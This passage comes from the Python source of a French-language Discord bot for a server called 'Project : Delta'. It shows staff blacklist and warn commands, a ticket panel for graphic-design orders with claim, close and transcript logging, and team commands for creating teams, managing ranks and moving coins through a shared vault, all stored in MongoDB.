        if log_channel:
            await log_channel.send(embed=embed)
    else:
        await ctx.reply(f"{member.mention} n'a pas de warn.")

# BLACKLIST
@bot.hybrid_command(name="delta-blacklist", description="Blacklist un utilisateur")
async def delta_blacklist(ctx, member: discord.Member, *, reason: str):
    if not is_staff(ctx):
        return await ctx.reply("Tu n'as pas la permission d'utiliser cette commande.")

    if await is_target_protected(member.id):
        return await ctx.reply("Tu ne peux pas blacklist cet utilisateur.")

    collection25.update_one(
        {"user_id": str(member.id)},
        {"$set": {
            "reason": reason,
            "timestamp": datetime.utcnow()
        }},
        upsert=True
    )

    try:
        await member.send(f"⛔ Tu as été **blacklist** du bot **Project : Delta**.\n**Raison :** `{reason}`")
    except:
        pass

    embed = discord.Embed(
        title="⛔ Utilisateur blacklist",
        description=f"{member.mention} a été ajouté à la blacklist.",
        color=discord.Color.red()
    )
    embed.add_field(name="👮 Modérateur", value=ctx.author.mention, inline=True)
    embed.add_field(name="💬 Raison", value=reason, inline=False)
    embed.timestamp = datetime.utcnow()
    await ctx.reply(embed=embed)

    log_channel = bot.get_channel(BLACKLIST_LOG_CHANNEL)
    if log_channel:
        await log_channel.send(embed=embed)

# UNBLACKLIST
@bot.hybrid_command(name="delta-unblacklist", description="Retirer un utilisateur de la blacklist")
async def delta_unblacklist(ctx, member: discord.Member, *, reason: str):
    if not is_staff(ctx):
        return await ctx.reply("Tu n'as pas la permission d'utiliser cette commande.")

    result = collection25.delete_one({"user_id": str(member.id)})
    if result.deleted_count:
        try:
            await member.send(f"✅ Tu as été **retiré de la blacklist** du bot **Project : Delta**.\n**Raison :** `{reason}`")
        except:
            pass

        embed = discord.Embed(
            title="📤 Utilisateur retiré de la blacklist",
            description=f"{member.mention} a été unblacklist.",
            color=discord.Color.green()
        )
        embed.add_field(name="👮 Modérateur", value=ctx.author.mention, inline=True)
        embed.add_field(name="💬 Raison", value=reason, inline=False)
        embed.timestamp = datetime.utcnow()
        await ctx.reply(embed=embed)

        log_channel = bot.get_channel(UNBLACKLIST_LOG_CHANNEL)
        if log_channel:
            await log_channel.send(embed=embed)
    else:
        await ctx.reply(f"{member.mention} n'était pas blacklist.")

# LISTE DES WARNS
@bot.hybrid_command(name="delta-list-warn", description="Lister les warns d’un utilisateur")
async def delta_list_warn(ctx, member: discord.Member):
    if not is_staff(ctx):
        return await ctx.reply("Tu n'as pas la permission d'utiliser cette commande.")
    
    warns = list(collection24.find({"user_id": str(member.id)}))
    if not warns:
        return await ctx.reply(f"Aucun warn trouvé pour {member.mention}.")

    embed = discord.Embed(title=f"⚠️ Warns de {member.display_name}", color=discord.Color.orange())
    for i, warn in enumerate(warns, start=1):
        mod = await bot.fetch_user(int(warn['moderator_id']))
        embed.add_field(
            name=f"Warn #{i}",
            value=f"**Par:** {mod.mention}\n**Raison:** `{warn['reason']}`\n**Date:** <t:{int(warn['timestamp'].timestamp())}:R>",
            inline=False
        )
    await ctx.reply(embed=embed)

# LISTE DES BLACKLIST
@bot.hybrid_command(name="delta-list-blacklist", description="Lister les utilisateurs blacklist")
async def delta_list_blacklist(ctx):
    if not is_staff(ctx):
        return await ctx.reply("Tu n'as pas la permission d'utiliser cette commande.")

    blacklisted = list(collection25.find({}))
    if not blacklisted:
        return await ctx.reply("Aucun membre n'est blacklist.")

    embed = discord.Embed(title="🚫 Membres blacklist", color=discord.Color.red())
    for i, bl in enumerate(blacklisted, start=1):
        try:
            user = await bot.fetch_user(int(bl['user_id']))
            embed.add_field(
                name=f"Blacklist #{i}",
                value=f"**Membre :** {user.mention}\n**Raison :** `{bl['reason']}`\n**Date :** <t:{int(bl['timestamp'].timestamp())}:R>",
                inline=False
            )
        except:
            pass
    await ctx.reply(embed=embed)
#---------------------------------------------------------------------------- Ticket:

# --- MODAL POUR FERMETURE ---
class TicketModal(ui.Modal, title="Fermer le ticket"):
    reason = ui.TextInput(label="Raison de fermeture", style=discord.TextStyle.paragraph)

    async def on_submit(self, interaction: discord.Interaction):
        channel = interaction.channel
        guild = interaction.guild
        reason = self.reason.value

        transcript_channel = guild.get_channel(TRANSCRIPT_CHANNEL_ID)

        # Génération du transcript
        messages = [msg async for msg in channel.history(limit=None)]
        transcript_text = "\n".join([
            f"{msg.created_at.strftime('%Y-%m-%d %H:%M')} - {msg.author}: {msg.content}"
            for msg in messages if msg.content
        ])
        file = discord.File(fp=io.StringIO(transcript_text), filename="transcript.txt")

        # Récupération de qui a ouvert et claim
        ticket_data = collection16.find_one({"channel_id": str(channel.id)})

        opened_by = guild.get_member(int(ticket_data["user_id"])) if ticket_data else None
        claimed_by = None
        # Recherche dans le dernier message envoyé contenant l'embed de création
        async for msg in channel.history(limit=50):
            if msg.embeds:
                embed = msg.embeds[0]
                if embed.footer and "Claimé par" in embed.footer.text:
                    user_id = int(embed.footer.text.split("Claimé par ")[-1].replace(">", "").replace("<@", ""))
                    claimed_by = guild.get_member(user_id)
                    break

        # Log dans le canal transcript
        embed_log = discord.Embed(
            title="📁 Ticket Fermé",
            color=discord.Color.red()
        )
        embed_log.add_field(name="Ouvert par", value=opened_by.mention if opened_by else "Inconnu", inline=True)
        embed_log.add_field(name="Claimé par", value=claimed_by.mention if claimed_by else "Non claim", inline=True)
        embed_log.add_field(name="Fermé par", value=interaction.user.mention, inline=True)
        embed_log.add_field(name="Raison", value=reason, inline=False)
        embed_log.set_footer(text=f"Ticket: {channel.name} | ID: {channel.id}")
        embed_log.timestamp = discord.utils.utcnow()

        await transcript_channel.send(embed=embed_log, file=file)

        # Suppression du channel
        await interaction.response.send_message("✅ Ticket fermé.", ephemeral=True)
        await channel.delete()

# --- VIEW AVEC CLAIM & FERMETURE ---
class ClaimCloseView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label="Claim", style=ButtonStyle.blurple, custom_id="claim")
    async def claim_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        if SUPPORT_ROLE_ID not in [role.id for role in interaction.user.roles]:
            return await interaction.response.send_message("❌ Tu n'as pas la permission de claim.", ephemeral=True)

        # Désactive le bouton
        button.disabled = True
        await interaction.message.edit(view=self)

        # Ajoute une note dans le footer de l'embed
        embed = interaction.message.embeds[0]
        embed.set_footer(text=f"Claimé par {interaction.user.mention}")
        await interaction.message.edit(embed=embed)

        await interaction.response.send_message(f"📌 Ticket claim par {interaction.user.mention}.")

    @ui.button(label="Fermer", style=ButtonStyle.red, custom_id="close")
    async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TicketModal())

class TicketView(ui.View):
    def __init__(self, author_id):
        super().__init__(timeout=None)
        self.author_id = author_id

    @ui.button(label="Passé Commande", style=ButtonStyle.success, custom_id="open_ticket")
    async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
    
        guild = interaction.guild
        category = guild.get_channel(1362015652700754052)  # ← Catégorie spécifique

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True),
        }

        channel_name = f"︱🤖・{interaction.user.name}"
        ticket_channel = await guild.create_text_channel(
            name=channel_name,
            overwrites=overwrites,
            category=category  # ← Ajout ici
        )

        # Mention puis suppression du message
        await ticket_channel.send("@everyone")
        await ticket_channel.purge(limit=1)

        # Embed d'accueil
        embed = discord.Embed(
            title="Bienvenue dans votre ticket commande",
            description=(
                "**Bonjour,**\n\n"
                "Avant de passer votre commande, merci de vous assurer que vous disposez bien des fonds nécessaires :\n"
                "- Si vous payez en **Coins**, vérifiez votre solde avec la commande +bal.\n"
                "- Si vous payez en **argent réel**, assurez-vous d’avoir la somme requise avant de valider votre demande.\n\n"
                "Pour garantir une prise en charge rapide par un graphiste, merci de fournir un maximum de détails concernant votre commande : "
                "couleurs, style souhaité, format, usage prévu, réseaux sociaux, etc.\n\n"
                "Plus votre demande est précise, plus nous pourrons vous offrir un service adapté dans les meilleurs délais.\n\n"
                "En l’absence de mention d’un graphiste spécifique, tout membre de l’équipe se réserve le droit de prendre en charge votre commande.\n\n"
                "**Cordialement,**\n"
                "*Le staff Project : Delta*"
            ),
            color=0x5865F2
        )
        embed.set_image(url="https://github.com/Iseyg91/KNSKS-ET/blob/main/IMAGES%20Delta/uri_ifs___M_a08ff46b-5005-4ddb-86d9-a73f638d5cf2.jpg?raw=true")

        # Envoi de l’embed avec les boutons
        await ticket_channel.send(embed=embed, view=ClaimCloseView())

        # Sauvegarde MongoDB
        collection16.insert_one({
            "guild_id": str(guild.id),
            "user_id": str(interaction.user.id),
            "channel_id": str(ticket_channel.id),
            "opened_at": datetime.utcnow(),
            "status": "open"
        })

        await interaction.response.send_message(f"✅ Ton ticket a été créé : {ticket_channel.mention}", ephemeral=True)

# --- COMMANDE PANEL ---
@bot.command(name="panel")
async def panel(ctx):
    if ctx.author.id != ISEY_ID:
        return await ctx.send("❌ Tu n'es pas autorisé à utiliser cette commande.")

    embed = discord.Embed(
        title="Passer commande",
        description="Vous souhaitez passer une commande ? N'hésitez pas à ouvrir un ticket et nous serons ravis de vous assister !",
        color=0x2ecc71
    )
    await ctx.send(embed=embed, view=TicketView(author_id=ctx.author.id))

# --- PANEL2 ---
@bot.command(name="panel2")
async def panel2(ctx):
    if ctx.author.id != ISEY_ID:
        return await ctx.send("❌ Tu n'es pas autorisé à utiliser cette commande.")

    embed = discord.Embed(
        title="Passer commande",
        description="Vous souhaitez passer une commande ? N'hésitez pas à ouvrir un ticket et nous serons ravis de vous assister !",
        color=0x2ecc71
    )
    # Mise à jour du bouton avec l'emoji 🎨
    await ctx.send(embed=embed, view=TicketView(author_id=ctx.author.id))

# --- PANEL3 ---
@bot.command(name="panel3")
async def panel3(ctx):
    if ctx.author.id != ISEY_ID:
        return await ctx.send("❌ Tu n'es pas autorisé à utiliser cette commande.")

    embed = discord.Embed(
        title="Passer commande",
        description="Vous souhaitez passer une commande ? N'hésitez pas à ouvrir un ticket et nous serons ravis de vous assister !",
        color=0x2ecc71
    )
    # Mise à jour du bouton avec l'emoji 🖇️
    await ctx.send(embed=embed, view=TicketView(author_id=ctx.author.id))

# --- PANEL4 ---
@bot.command(name="panel4")
async def panel4(ctx):
    if ctx.author.id != ISEY_ID:
        return await ctx.send("❌ Tu n'es pas autorisé à utiliser cette commande.")

    embed = discord.Embed(
        title="Passer commande",
        description="Vous souhaitez passer une commande ? N'hésitez pas à ouvrir un ticket et nous serons ravis de vous assister !",
        color=0x2ecc71
    )
    # Mise à jour du bouton avec l'emoji 🎓
    await ctx.send(embed=embed, view=TicketView(author_id=ctx.author.id))

#--------------------------------------------------------------------------- Team

def check_project_delta(ctx):
    return ctx.guild and ctx.guild.id == PROJECT_DELTA

@bot.command()
async def tcreate(ctx):
    """Commande pour créer une nouvelle équipe (team)."""
    
    # Vérifie si l'utilisateur peut créer une team (par exemple, s'il a un projet delta actif)
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    guild_id = str(ctx.guild.id)

    # Récupère les informations économiques de l'utilisateur
    user_eco = collection10.find_one({"guild_id": guild_id, "user_id": user_id})
    
    # Vérifie si l'utilisateur a suffisamment de coins pour créer une team
    if not user_eco or user_eco.get("coins", 0) < 1500:
        await ctx.send("Désolé, tu n'as pas assez de coins pour créer une équipe. "
                       "Il te faut 1500 coins pour cela. 💰")
        return
    
    def check_msg(m):
        """Vérifie si le message provient de l'utilisateur et du bon canal."""
        return m.author == ctx.author and m.channel == ctx.channel

    # Demande le nom de la team
    await ctx.send("Quel sera le **nom** de ta team ? 🚀")
    team_name_msg = await bot.wait_for('message', check=check_msg)
    team_name = team_name_msg.content.strip()

    # Vérifie si une équipe avec ce nom existe déjà
    existing = collection17.find_one({"guild_id": guild_id, "team_id": team_name})
    if existing:
        await ctx.send("Ce nom de team existe déjà. 😕 Choisis-en un autre.")
        return

    # Demande la description de la team
    await ctx.send("Décris ta team en quelques mots. ✨")
    description_msg = await bot.wait_for('message', check=check_msg)
    description = description_msg.content.strip()

    # Déduction des coins pour la création de la team
    collection10.update_one({"guild_id": guild_id, "user_id": user_id}, {"$inc": {"coins": -1500}})
    
    # Insertion des données de la nouvelle équipe dans la base de données
    collection17.insert_one({
        "guild_id": guild_id,
        "team_id": team_name,
        "owner": user_id,
        "description": description,
        "members": {user_id: "Owner"},
        "vault": 0,  # Le coffre de la team est vide au départ
        "banned": []  # Aucun membre banni au départ
    })

    # Confirme la création de la team
    await ctx.send(f"🎉 Félicitations ! La team **{team_name}** a été créée avec succès ! 🚀")
    await ctx.send(f"Voici un résumé de ta team :\n"
                   f"**Nom** : {team_name}\n"
                   f"**Propriétaire** : <@{user_id}>\n"
                   f"**Description** : {description}\n"
                   f"Bonne chance dans cette aventure ! 🎮")

@bot.command(name="team", aliases=["t"])
async def team_command(ctx):
    """Commande pour afficher les informations de la team d'un utilisateur."""
    
    # Vérifie si l'utilisateur a un projet delta actif
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    guild_id = str(ctx.guild.id)

    # Récupère les informations de la team de l'utilisateur
    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})
    if not team:
        await ctx.send("Tu n'es dans aucune équipe. 😔")
        return

    # Création de l'embed pour afficher les informations de la team
    embed = discord.Embed(
        title=f"🏆 Team : {team['team_id']}",
        description=team['description'],
        color=0x1E7F1E  # Un vert plus doux pour une bonne lisibilité
    )
    
    # Affiche les coins du coffre (avec valeur par défaut de 0 si 'coffre' n'existe pas)
    embed.add_field(name="💰 Coffre-Fort", value=f"{team.get('coffre', 0)} coins", inline=False)

    # Création de la liste des membres avec leurs rôles
    members_str = ""
    for member_id, role in team['members'].items():
        member = ctx.guild.get_member(int(member_id))
        members_str += f"{member.mention if member else f'Utilisateur {member_id}'} - **{role}**\n"

    # Ajout des membres à l'embed
    embed.add_field(name="👥 Membres", value=members_str or "Aucun membre pour le moment", inline=False)

    # Envoie l'embed avec les informations de la team
    await ctx.send(embed=embed)


@bot.command()
async def tinvite(ctx, member: discord.Member):
    """Invite un membre à rejoindre ta team."""
    
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    target_id = str(member.id)
    guild_id = str(ctx.guild.id)

    # Recherche de la team du joueur
    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})
    if not team:
        await ctx.send("❌ Tu n'es dans aucune équipe.")
        return

    # Vérifie si le membre est banni
    if target_id in team['banned']:
        await ctx.send("🚫 Cette personne est bannie de la team.")
        return

    # Création de l'embed de l'invitation
    embed = discord.Embed(
        title="📩 Invitation à rejoindre une team",
        description=(
            f"{member.mention}, tu as été invité par **{ctx.author.display_name}** "
            f"à rejoindre la team **{team['team_id']}** ! 🎮\n\n"
            "Tu peux accepter ou refuser l'invitation en cliquant sur les boutons ci-dessous."
        ),
        color=0x3498db
    )
    embed.set_footer(text="Invitation envoyée par le système d'équipes")
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else discord.Embed.Empty)

    # Création de la view avec boutons
    view = discord.ui.View(timeout=60)

    async def accept_callback(interaction: discord.Interaction):
        if interaction.user.id != member.id:
            await interaction.response.send_message("⛔ Ce bouton ne t’est pas destiné.", ephemeral=True)
            return

        collection17.update_one(
            {"guild_id": guild_id, "team_id": team['team_id']},
            {"$set": {f"members.{target_id}": "Membre"}}
        )

        await interaction.response.edit_message(
            content=f"✅ {member.mention} a rejoint la team **{team['team_id']}** !",
            embed=None, view=None
        )

    async def refuse_callback(interaction: discord.Interaction):
        if interaction.user.id != member.id:
            await interaction.response.send_message("⛔ Ce bouton ne t’est pas destiné.", ephemeral=True)
            return

        await interaction.response.edit_message(
            content=f"❌ {member.mention} a refusé l'invitation à rejoindre la team **{team['team_id']}**.",
            embed=None, view=None
        )

    # Boutons
    accept_button = discord.ui.Button(label="Accepter ✅", style=discord.ButtonStyle.success)
    refuse_button = discord.ui.Button(label="Refuser ❌", style=discord.ButtonStyle.danger)
    accept_button.callback = accept_callback
    refuse_button.callback = refuse_callback

    # Ajout des boutons à la view
    view.add_item(accept_button)
    view.add_item(refuse_button)

    # Envoi de l'invitation
    await ctx.send(embed=embed, view=view)

@bot.command()
async def tpromote(ctx, member: discord.Member):
    """Commande pour promouvoir un membre de sa team."""
    
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    target_id = str(member.id)
    guild_id = str(ctx.guild.id)

    # Récupère la team de l'auteur
    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})
    if not team or target_id not in team.get("members", {}):
        await ctx.send(embed=discord.Embed(
            description="❌ Cette personne ne fait pas partie de ta team.",
            color=0xE74C3C
        ))
        return

    role_order = ["Membre", "Officier", "Bras-Droit", "Second"]
    roles = team["members"]

    author_role = roles.get(user_id)
    target_role = roles.get(target_id)

    # Vérifie les permissions
    if author_role not in ["Owner", "Second"]:
        await ctx.send(embed=discord.Embed(
            description="⛔ Tu n'as pas la permission de promouvoir des membres.",
            color=0xE67E22
        ))
        return

    # Vérifie si la personne est déjà au rang maximal
    if target_role == "Second":
        await ctx.send(embed=discord.Embed(
            description="⚠️ Cette personne est déjà au grade le plus élevé.",
            color=0xF1C40F
        ))
        return

    next_index = role_order.index(target_role) + 1
    new_rank = role_order[next_index]

    # Un seul "Second" autorisé
    if new_rank == "Second":
        for member_id, r in roles.items():
            if r == "Second":
                await ctx.send(embed=discord.Embed(
                    description="🚫 Il y a déjà un **Second** dans la team. Un seul est autorisé.",
                    color=0x9B59B6
                ))
                return

    # Mise à jour du grade dans la base de données
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {"$set": {f"members.{target_id}": new_rank}}
    )

    # Confirmation dans un embed
    embed = discord.Embed(
        title="📈 Promotion",
        description=(
            f"{member.mention} a été promu au rang **{new_rank}** dans la team **{team['team_id']}** ! 🎉"
        ),
        color=0x2ECC71
    )
    embed.set_footer(text=f"Promu par {ctx.author.display_name}")
    embed.set_thumbnail(url=member.avatar.url if member.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def tdemote(ctx, member: discord.Member):
    """Commande pour rétrograder un membre de sa team."""
    
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    target_id = str(member.id)
    guild_id = str(ctx.guild.id)

    # Récupération des données de la team
    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})
    if not team or target_id not in team.get("members", {}):
        await ctx.send(embed=discord.Embed(
            description="❌ Cette personne ne fait pas partie de ta team.",
            color=0xE74C3C
        ))
        return

    role_order = ["Membre", "Officier", "Bras-Droit", "Second"]
    roles = team["members"]

    author_role = roles.get(user_id)
    target_role = roles.get(target_id)

    # Vérifie si l'utilisateur a les droits
    if author_role not in ["Owner", "Second"]:
        await ctx.send(embed=discord.Embed(
            description="⛔ Tu n'as pas la permission de rétrograder des membres.",
            color=0xE67E22
        ))
        return

    # Vérifie si le membre est déjà au plus bas rang
    if target_role == "Membre":
        await ctx.send(embed=discord.Embed(
            description="⚠️ Cette personne est déjà au rang le plus bas.",
            color=0xF1C40F
        ))
        return

    # Rétrogradation
    new_index = role_order.index(target_role) - 1
    new_rank = role_order[new_index]

    # Mise à jour du rôle dans la base de données
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {"$set": {f"members.{target_id}": new_rank}}
    )

    # Confirmation en embed
    embed = discord.Embed(
        title="📉 Rétrogradation",
        description=(
            f"{member.mention} a été rétrogradé au rang **{new_rank}** dans la team **{team['team_id']}**."
        ),
        color=0xE67E22
    )
    embed.set_footer(text=f"Rétrogradé par {ctx.author.display_name}")
    embed.set_thumbnail(url=member.avatar.url if member.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def towner(ctx, member: discord.Member):
    """Transfert de propriété de la team à un autre membre."""

    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    new_owner_id = str(member.id)
    guild_id = str(ctx.guild.id)

    # Récupère la team où l'utilisateur est propriétaire
    team = collection17.find_one({"guild_id": guild_id, "owner": user_id})
    if not team or new_owner_id not in team.get("members", {}):
        await ctx.send(embed=discord.Embed(
            description="❌ Cette personne ne fait pas partie de ta team.",
            color=0xE74C3C
        ))
        return

    # Mise à jour du propriétaire et des rôles
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {
            "$set": {
                "owner": new_owner_id,
                f"members.{user_id}": "Second",
                f"members.{new_owner_id}": "Owner"
            }
        }
    )

    # Confirmation en embed
    embed = discord.Embed(
        title="👑 Transfert de Propriété",
        description=(
            f"{member.mention} est désormais le **nouveau propriétaire** de la team "
            f"**{team['team_id']}** !\n\n"
            f"👏 Merci à {ctx.author.mention} pour son service en tant qu'ancien Owner."
        ),
        color=0x3498db
    )
    embed.set_footer(text="Changement de direction de l'équipe")
    embed.set_thumbnail(url=member.avatar.url if member.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def tedit(ctx):
    """Permet au propriétaire de modifier le nom ou la description de sa team."""
    
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    guild_id = str(ctx.guild.id)

    # Vérifie que l'utilisateur est bien owner d'une team
    team = collection17.find_one({"guild_id": guild_id, "owner": user_id})
    if not team:
        await ctx.send(embed=discord.Embed(
            description="❌ Tu n'es pas propriétaire d'une team.",
            color=0xE74C3C
        ))
        return

    class TeamEditSelect(discord.ui.Select):
        def __init__(self):
            options = [
                discord.SelectOption(
                    label="Changer la description",
                    value="desc",
                    description="Modifier la description publique de la team"
                ),
                discord.SelectOption(
                    label="Changer le nom d'affichage",
                    value="name",
                    description="⚠️ Cela ne change pas l'identifiant unique (ID)"
                )
            ]
            super().__init__(
                placeholder="📌 Que souhaites-tu modifier ?",
                min_values=1,
                max_values=1,
                options=options
            )

        async def callback(self, interaction: discord.Interaction):
            if interaction.user.id != ctx.author.id:
                await interaction.response.send_message("⛔ Tu ne peux pas interagir avec cette sélection.", ephemeral=True)
                return

            selected = self.values[0]
            prompt = "✏️ Envoie la **nouvelle description** :" if selected == "desc" else "📝 Envoie le **nouveau nom** de la team :"

            await interaction.response.send_message(prompt, ephemeral=True)

            try:
                msg = await bot.wait_for(
                    "message",
                    timeout=60.0,
                    check=lambda m: m.author.id == ctx.author.id and m.channel == ctx.channel
                )
            except asyncio.TimeoutError:
                await interaction.followup.send("⏰ Temps écoulé. Action annulée.", ephemeral=True)
                return

            if selected == "desc":
                collection17.update_one(
                    {"guild_id": guild_id, "team_id": team["team_id"]},
                    {"$set": {"description": msg.content}}
                )
                result_msg = "📝 La description de la team a été mise à jour avec succès."
            else:
                collection17.update_one(
                    {"guild_id": guild_id, "team_id": team["team_id"]},
                    {"$set": {"name": msg.content}}
                )
                result_msg = "✅ Le **nom d'affichage** de la team a été mis à jour.\n*(L'identifiant reste inchangé)*"

            await interaction.followup.send(embed=discord.Embed(
                description=result_msg,
                color=0x2ECC71
            ))

    class TeamEditView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)
            self.add_item(TeamEditSelect())

    embed = discord.Embed(
        title="🛠️ Modification de Team",
        description="Choisis ce que tu veux modifier dans ta team :",
        color=0x3498DB
    )
    embed.set_footer(text="Commande réservée aux propriétaires de team.")

    await ctx.send(embed=embed, view=TeamEditView())

@bot.command()
async def tdep(ctx, amount: str):
    """Dépose des coins dans le coffre de la team."""
    
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    guild_id = str(ctx.guild.id)

    eco = collection10.find_one({"guild_id": guild_id, "user_id": user_id})
    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})

    # Vérifications d'appartenance à une team et de solde
    if not team:
        return await ctx.send(embed=discord.Embed(
            description="❌ Tu ne fais partie d'aucune team.",
            color=0xE74C3C
        ))
    if not eco or eco.get("coins", 0) <= 0:
        return await ctx.send(embed=discord.Embed(
            description="💸 Tu n'as pas assez de coins pour effectuer un dépôt.",
            color=0xF39C12
        ))

    user_balance = eco["coins"]

    # Gestion du montant à déposer
    if amount.lower() == "all":
        deposit = user_balance
    elif amount.isdigit():
        deposit = int(amount)
        if deposit <= 0:
            return await ctx.send(embed=discord.Embed(
                description="🚫 Le montant doit être supérieur à 0.",
                color=0xE67E22
            ))
        if deposit > user_balance:
            return await ctx.send(embed=discord.Embed(
                description="❗ Tu n'as pas assez de coins pour ce dépôt.",
                color=0xE74C3C
            ))
    else:
        return await ctx.send(embed=discord.Embed(
            description="❌ Montant invalide. Utilise un nombre ou `all`.",
            color=0xE74C3C
        ))

    # Mise à jour des bases de données
    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$inc": {"coins": -deposit}}
    )
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {"$inc": {"coffre": deposit}}  # Assure-toi que le champ 'coffre' est bien mis à jour
    )

    # Confirmation en embed
    embed = discord.Embed(
        title="💰 Dépôt effectué",
        description=f"Tu as déposé **{deposit}** 🪙 dans le coffre de la team **{team['team_id']}**.",
        color=0x2ECC71
    )
    embed.set_footer(text="Merci pour ta contribution à l'équipe !")
    embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def twith(ctx, amount: str):
    """Permet de retirer des coins du coffre de la team (autorisé uniquement à certains grades)."""
    
    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    guild_id = str(ctx.guild.id)

    eco = collection10.find_one({"guild_id": guild_id, "user_id": user_id})
    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})

    if not team:
        return await ctx.send(embed=discord.Embed(
            description="❌ Tu ne fais partie d'aucune team.",
            color=0xE74C3C
        ))

    # Rôle du membre dans la team
    role = team["members"].get(user_id)
    if role not in ["Officier", "Bras-Droit", "Second", "Owner"]:
        return await ctx.send(embed=discord.Embed(
            description="⛔ Tu n'as pas le grade requis pour faire un retrait.\n(Il faut être au moins **Officier**)",
            color=0xF39C12
        ))

    coffre = team.get("coffre", 0)  # Valeur par défaut 0 si 'coffre' n'existe pas

    # Détermination du montant à retirer
    if amount.lower() == "all":
        if coffre <= 0:
            return await ctx.send(embed=discord.Embed(
                description="💸 Le coffre est vide.",
                color=0xE74C3C
            ))
        withdraw = coffre
    elif amount.isdigit():
        withdraw = int(amount)
        if withdraw <= 0:
            return await ctx.send(embed=discord.Embed(
                description="🚫 Le montant doit être supérieur à 0.",
                color=0xE67E22
            ))
        if withdraw > coffre:
            return await ctx.send(embed=discord.Embed(
                description="❗ Le coffre ne contient pas assez de coins.",
                color=0xE74C3C
            ))
    else:
        return await ctx.send(embed=discord.Embed(
            description="❌ Montant invalide. Utilise un nombre ou `all`.",
            color=0xE74C3C
        ))

    # Mise à jour des bases de données
    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$inc": {"coins": withdraw}}
    )
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {"$inc": {"coffre": -withdraw}}  # Assure-toi que le champ 'coffre' est bien mis à jour
    )

    # Embed de confirmation
    embed = discord.Embed(
        title="🏦 Retrait effectué",
        description=f"Tu as retiré **{withdraw}** 🪙 du coffre de la team **{team['team_id']}**.",
        color=0x2ECC71
    )
    embed.set_footer(text=f"Effectué par {ctx.author.display_name}")
    embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def ttop(ctx):
    """Affiche le classement des teams selon leur coffre."""

    if not check_project_delta(ctx):
        return

    guild_id = str(ctx.guild.id)
    teams = list(collection17.find({"guild_id": guild_id}).sort("coffre", -1).limit(10))

    if not teams:
        return await ctx.send(embed=discord.Embed(
            description="❌ Aucune team trouvée dans ce serveur.",
            color=0xE74C3C
        ))

    embed = discord.Embed(
        title="🏆 Top 10 des Teams par Coffre",
        description="Voici les teams les plus riches de ce serveur !",
        color=discord.Color.gold()
    )

    for i, team in enumerate(teams, start=1):
        name = team.get("name") or team.get("team_id", "Sans nom")
        coffre = team.get("coffre", 0)
        owner_id = team.get("owner")
        owner_mention = f"<@{owner_id}>" if owner_id else "Inconnu"

        embed.add_field(
            name=f"**#{i}** - {name}",
            value=f"💰 **{coffre}** 🪙\n👑 Propriétaire : {owner_mention}",
            inline=False
        )

    embed.set_footer(text="Basé sur le contenu du coffre de chaque team.")
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def tkick(ctx, member: discord.Member):
    """Permet de retirer un membre de sa team (si autorisé)."""

    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    target_id = str(member.id)
    guild_id = str(ctx.guild.id)

    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})

    if not team:
        return await ctx.send(embed=discord.Embed(
            description="❌ Tu ne fais partie d'aucune team.",
            color=0xE74C3C
        ))

    if target_id not in team.get("members", {}):
        return await ctx.send(embed=discord.Embed(
            description="🚫 Ce membre ne fait pas partie de ta team.",
            color=0xE67E22
        ))

    if target_id == user_id:
        return await ctx.send(embed=discord.Embed(
            description="🤨 Tu ne peux pas te kick toi-même.",
            color=0xF1C40F
        ))

    role = team["members"].get(user_id)
    target_role = team["members"].get(target_id)

    if role not in ["Second", "Owner"]:
        return await ctx.send(embed=discord.Embed(
            description="⛔ Tu n'as pas la permission d'exclure un membre (il faut être **Second** ou **Owner**).",
            color=0xE74C3C
        ))

    # Empêcher qu’un Second kick un Owner ou un autre Second
    role_hierarchy = {"Membre": 1, "Officier": 2, "Bras-Droit": 3, "Second": 4, "Owner": 5}
